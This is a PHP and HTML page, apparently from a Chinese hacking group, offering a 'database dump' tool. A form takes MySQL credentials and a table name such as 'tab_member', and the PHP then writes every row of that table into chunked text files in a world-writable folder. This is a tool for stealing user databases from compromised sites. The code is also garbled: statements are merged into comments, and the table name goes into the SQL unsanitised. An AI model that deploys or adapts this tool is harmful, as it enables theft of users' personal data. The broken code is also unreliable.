<html>
<head>
<title>TK:全面解密脱裤门内幕 --- hExIe Security Team...</title>
</head>
 
<body>
<h4>Mysql Database on Tables to Txt...</h4>
</br>
This is a Php Example.</br></br>#_
E-mail:go_root@hotmail.com </br></br>#_
Author:HYrz</br></br>
--------------------------------------------------------</br>
Start Main OK~
........
 
<form action="myback.php" method="POST" name="Submit">
<b>Host: </b>
<input type="text" name="host" value="127.0.0.1:3306"></br></br>
<b> User: </b>
<input type="text" name="user" value="root"></br></br>
<b> Password: </b>
<input type="text" name="pass" value="123456"></br></br>
<b> Database Check: </b>
<input type="text" name="database" value="test"></br></br>
<b> Tables is: </b>
<input type="text" name="table" value="tab_member"></br></br>
<b>New_Data Filename:</b>
<input type="text" name="back_file" value="data.txt"></br></br>
<h6>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</h6>
<input type="submit" name="submit" value="只要点击马上就脱裤">
</br>
<h6>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</h6>
</form>
</>
</body>
 
<?php
set_time_limit(0);
error_reporting(E_ALL);
$db_host
									=
									$_POST["host"];
$db_user
									=
									$_POST["user"];
$db_pass
									=
									$_POST["pass"];
$db_database
									=
									$_POST["database"];
$db_table
									=
									$_POST["table"];
$backDB_Filename
									=
									$_POST["back_file"];
 
if
									(!isset($db_host))
{
echo
									"Messagebox: Host Error!";
}elseif
									(!isset($db_user))
{
echo
									"Messagebox: User Error!"; 
}elseif
									(!isset($db_pass))
{
echo
									"Messagebox: Pass Error!";
}elseif
									(!isset($db_database))
{
echo
									"Messagebox: Database Error!";
}elseif
									(!isset($db_table))
{
echo
									"Messagebox: table Error!";
}elseif
									(!isset($backDB_Filename))
{
echo
									"Messagebox: backDB_Filename Error!";
}
									#endif if
									(!is_dir('data_xiaosan'))
{
mkdir('data_xiaosan',0777); 
}#endif $sql
									=
									mysql_connect($db_host,$db_user,$db_pass) or die("Could not connect: "
									.
									mysql_error());
mysql_select_db($db_database,$sql) or die("Could not connect: "
									.
									mysql_error());
$result
									=
									mysql_query("SELECT * FROM $db_table",$sql) or
die("Could not connect: "
									.
									mysql_error());
$i
									=
									0;
$tmp
									=
									'';
while
									($row
									=
									mysql_fetch_array($result, MYSQL_NUM))
									{
$i
									=
									$i+1;
$tmp
									.=
									implode("::",
									$row)."n";
if(!($i%500)){
$filename
									=
									'data_xiaosan/'.intval($i/500).'_$backDB_Filename';
file_put_contents($filename,$tmp);
$tmp
									=
									'';
}#endif }#endwhile mysql_free_result($result);
mysql_close($sql);
die("Messagebox : Data Write Success!!!");
?>
</html>